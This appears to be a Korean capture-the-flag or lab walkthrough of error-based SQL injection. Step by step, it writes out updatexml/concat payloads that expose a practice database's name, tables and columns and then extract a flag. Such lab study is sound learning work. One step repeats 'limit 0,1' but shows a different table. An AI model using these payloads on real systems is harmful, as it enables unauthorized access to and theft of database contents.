# Error Based SQL Injection    
SQL 질의문 결과가 화면에 안나오는 곳   
ex)   
로그인, 아이디 중복체크   

## nor'   
이라고 치니까? sql error 가 떳네? 그러면 땡잡았다. 

## 1. 추측
추측을 해보자
db 를 조회하는 거니까
select ??? from ??? where id=''
like 나 % 를 쓰진 않을 거임. 아이디는 정확하고 유일해야 하니까.

## 2. db 에러인지 확인.
에러문 읽어보자

## 3. error based SQL Injection Function
논리 에러(문법은 맞아야 함.)   
먼저 SQL Injection Function 을 사용하면 됨.   
-updatexml   
1' and updatexml(null,concat(0x3a,'test'),null) and '1'='1   
기본 구조는   
and ( 내가 넣고 싶은 구문) and '1'='1   

concat = 합치는 함수   
0x3a = :   
->    
:test   
:test 라는 문자열을 뜻함.   
저 함수의 의미는    
:test 라는 파일을 찾으라는 것임.   
:test 라는 파일이 없는데? 라면서 논리 오류 배출.   

1' and updatexml(null,concat(0x3a,'test'),null) and '1'='1   
결과가 논리 에러를 나오면   
'test' 부분에 select 문을 치면 가능함   
1' and updatexml(null,concat(0x3a,(select 'test')),null) and '1'='1   
select 들어갔는데도 그대로 나오네? ㅇㅋ 다음   

## 4. DB 이름 확인
db 이름 확인해보자.   
그럼 select 'test' 부분을 빼고   
select database() 넣기만 하면 되겠네?   

1' and updatexml(null,concat(0x3a,(select database())),null)and '1'='1   
segfault_sql 라는 db 이름 확인.   

## 5. table 이름 확인
table 이름도 확인하자   
select table_name from information_schema.tables where table_schema='segfault_sql'   
이게 테이블 이름 확인할 수 있는 쿼리문이니까   
아까 select database() 대신해서 넣자   
1' and updatexml(null,concat(0x3a,(select table_name from information_schema.tables where table_schema='segfault_sql')),null) and '1'='1   
넣으니까 컬럼 1개만 출력할 수 있다는 오류가 떳음.   
ㅇㅋ 그럼 하나씩 확인해야지  

## limit
limit 사용.   
맨 뒤에 limit 0,1 을 붙이면 맨 처음 1개를 출력한다는 의미.   

1' and updatexml(null,concat(0x3a,(select table_name from information_schema.tables where table_schema='segfault_sql' limit 0,1)),null) and '1'='1   
game   

1' and updatexml(null,concat(0x3a,(select table_name from information_schema.tables where table_schema='segfault_sql' limit 0,1)),null) and '1'='1   
member

1' and updatexml(null,concat(0x3a,(select table_name from information_schema.tables where table_schema='segfault_sql' limit 2,1)),null) and '1'='1   
secret 

secret 컬럼 수상하다 이거 살펴보자   


## 6. column 이름 확인
똑같이 같은 함수에   
select column_name from information_schema.columns where table_name='secret' limit 0,1   
이거 넣으면 되니까   

1' and updatexml(null,concat(0x3a,()),null) and '1'='1   
select column_name from information_schema.columns where table_name='secret' limit 0,1

1' and updatexml(null,concat(0x3a,(select column_name from information_schema.columns where table_name='secret' limit 0,1)),null) and '1'='1   
idx

1' and updatexml(null,concat(0x3a,(select column_name from information_schema.columns where table_name='secret' limit 1,1)),null) and '1'='1   
secret 

secret 컬럼까지 나왔다.

## 7. 데이터 추출
이제 데이터 확인하자   
1' and updatexml(null,concat(0x3a,(select secret from secret)),null) and '1'='1

select secret from secret 

:segfault{fllllllllag}   
플래그 나왔네

